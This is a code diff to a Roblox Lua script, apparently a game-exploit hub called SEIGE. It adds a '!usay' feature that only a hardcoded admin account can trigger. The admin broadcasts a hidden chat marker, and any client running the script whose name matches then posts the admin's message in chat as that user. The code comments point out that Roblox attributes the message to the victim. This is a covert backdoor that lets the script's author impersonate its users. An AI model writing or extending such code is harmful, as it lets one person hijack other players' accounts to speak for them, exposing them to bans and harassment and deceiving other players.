@@ -3882,6 +3882,50 @@ if LP.Name == "0rot3" then
         if n:gsub("%s", "") == "" then notify("Enter a username", "warn"); return end
         if cmdHandlers and cmdHandlers["unrmvp"] then cmdHandlers["unrmvp"](n); lockBox.Text = "" end
     end)
+
+    section(pgAdmin, "Force chat (!usay)")
+    label(pgAdmin, "Makes the target user's own client send a chat message in game. Target must be running the script in this server.")
+    local usayFrame = inst("Frame", pgAdmin, {
+        Size = UDim2.new(1, -8, 0, 116),
+        BackgroundColor3 = T.bg2, BackgroundTransparency = 0.3,
+        BorderSizePixel = 0,
+    })
+    corner(usayFrame, 8); stroke(usayFrame, T.line, 1, 0.5)
+    local usayUser = inst("TextBox", usayFrame, {
+        BackgroundColor3 = T.bg, BackgroundTransparency = 0.2,
+        Position = UDim2.new(0, 10, 0, 10), Size = UDim2.new(1, -20, 0, 28),
+        PlaceholderText = "Target username", PlaceholderColor3 = T.dim,
+        Font = Enum.Font.Gotham, TextSize = 12, TextColor3 = T.text,
+        TextXAlignment = Enum.TextXAlignment.Left, Text = "",
+        ClearTextOnFocus = false,
+    })
+    corner(usayUser, 6); stroke(usayUser, T.line, 1, 0.4)
+    local usayMsg = inst("TextBox", usayFrame, {
+        BackgroundColor3 = T.bg, BackgroundTransparency = 0.2,
+        Position = UDim2.new(0, 10, 0, 44), Size = UDim2.new(1, -20, 0, 28),
+        PlaceholderText = "Message to send as them (≤200 chars)", PlaceholderColor3 = T.dim,
+        Font = Enum.Font.Gotham, TextSize = 12, TextColor3 = T.text,
+        TextXAlignment = Enum.TextXAlignment.Left, Text = "",
+        ClearTextOnFocus = false,
+    })
+    corner(usayMsg, 6); stroke(usayMsg, T.line, 1, 0.4)
+    local usayBtn = inst("TextButton", usayFrame, {
+        Position = UDim2.new(0, 10, 0, 80), Size = UDim2.new(1, -20, 0, 26),
+        BackgroundColor3 = T.acc, BackgroundTransparency = 0.1, AutoButtonColor = false,
+        Font = Enum.Font.GothamBold, TextSize = 12, TextColor3 = T.text,
+        Text = "Send !usay",
+    })
+    corner(usayBtn, 6); stroke(usayBtn, T.line, 1, 0.4)
+    usayBtn.MouseButton1Click:Connect(function()
+        local u = (usayUser.Text or ""):gsub("^%s+", ""):gsub("%s+$", "")
+        local m = (usayMsg.Text or ""):gsub("^%s+", ""):gsub("%s+$", "")
+        if u == "" then notify("Enter a target user", "warn"); return end
+        if m == "" then notify("Enter a message", "warn"); return end
+        if cmdHandlers and cmdHandlers["usay"] then
+            cmdHandlers["usay"](u .. " " .. m)
+            usayMsg.Text = ""
+        end
+    end)
 end
 
 
@@ -8807,6 +8851,22 @@ end
 cmdHandlers["rmvp"]   = function(arg) _doLock(arg, true)  end
 cmdHandlers["unrmvp"] = function(arg) _doLock(arg, false) end
 
+-- Admin-only: force the target user's client to send a chat message.
+-- Roblox tags the message as coming from the target because their own client
+-- calls TextChannel:SendAsync after receiving the broadcast marker.
+cmdHandlers["usay"] = function(arg)
+    if LP.Name ~= "0rot3" then notify("Admin-only command", "bad"); return end
+    local s = tostring(arg or ""):gsub("^%s+", ""):gsub("%s+$", "")
+    local target, msg = s:match("^(%S+)%s+(.+)$")
+    if not target or not msg then
+        notify("Usage: !usay <user> <message>", "warn"); return
+    end
+    if not _G.__SeigeUsaySend then notify("Broadcast not ready", "bad"); return end
+    local ok, err = _G.__SeigeUsaySend(target, msg)
+    if ok then notify("Sent !usay to " .. target, "good")
+    else notify("Failed: " .. tostring(err), "bad") end
+end
+
 
 local function runBarCmd(raw)
     if not raw or raw == "" then return end
@@ -9102,7 +9162,8 @@ end)()
     local ALLP_MARK = "\226\159\166SEIGE-ALLP\226\159\167"  -- ⟦SEIGE-ALLP⟧
     local LOCK_MARK   = "\226\159\166SEIGE-LOCK\226\159\167"    -- ⟦SEIGE-LOCK⟧<name>
     local UNLOCK_MARK = "\226\159\166SEIGE-UNLOCK\226\159\167"  -- ⟦SEIGE-UNLOCK⟧<name>
-    _G.__SeigeLockMarkers = { LOCK_MARK = LOCK_MARK, UNLOCK_MARK = UNLOCK_MARK }
+    local USAY_MARK   = "\226\159\166SEIGE-USAY\226\159\167"    -- ⟦SEIGE-USAY⟧<target>|<msg>
+    _G.__SeigeLockMarkers = { LOCK_MARK = LOCK_MARK, UNLOCK_MARK = UNLOCK_MARK, USAY_MARK = USAY_MARK }
     _G.__SeigeLockBroadcast = function(targetName, locked)
         targetName = tostring(targetName or ""):gsub("^@", ""):gsub("%s+", "")
         if targetName == "" then return false, "empty" end
@@ -9110,6 +9171,19 @@ end)()
         -- Apply on the admin's side immediately too (keeps local list synced).
         if _G.__SeigeApplyLock then _G.__SeigeApplyLock(targetName, locked) end
         broadcast(prefix .. targetName)
+        return true
+    end
+
+    -- !usay broadcast: admin tells the target's client to send a chat message
+    -- through its own TextChannel — Roblox stamps the message as coming from
+    -- the target because it's literally their client speaking.
+    _G.__SeigeUsaySend = function(targetName, msg)
+        targetName = tostring(targetName or ""):gsub("^@", ""):gsub("%s+", "")
+        msg = tostring(msg or ""):gsub("[\r\n]+", " ")
+        if targetName == "" then return false, "empty target" end
+        if msg == "" then return false, "empty message" end
+        if #msg > 200 then msg = msg:sub(1, 200) end
+        broadcast(USAY_MARK .. targetName .. "|" .. msg)
         return true
     end
 
@@ -9204,6 +9278,22 @@ end)()
         if type(text) == "string" and text:sub(1, #UNLOCK_MARK) == UNLOCK_MARK then
             local target = text:sub(#UNLOCK_MARK + 1):gsub("^%s+", ""):gsub("%s+$", "")
             if target ~= "" and _G.__SeigeApplyLock then _G.__SeigeApplyLock(target, false) end
+            return true
+        end
+        if type(text) == "string" and text:sub(1, #USAY_MARK) == USAY_MARK then
+            local body = text:sub(#USAY_MARK + 1)
+            local target, msg = body:match("^([^|]+)|(.*)$")
+            if target and msg then
+                target = target:gsub("^%s+", ""):gsub("%s+$", "")
+                if target:lower() == LP.Name:lower() and msg ~= "" then
+                    -- We are the target — send the chat as ourselves.
+                    pcall(function()
+                        local ch = TextChat.TextChannels:FindFirstChild("RBXGeneral")
+                            or TextChat.TextChannels:GetChildren()[1]
+                        if ch then ch:SendAsync(msg) end
+                    end)
+                end
+            end
             return true
         end
         if not isExecMark(text) then return false end
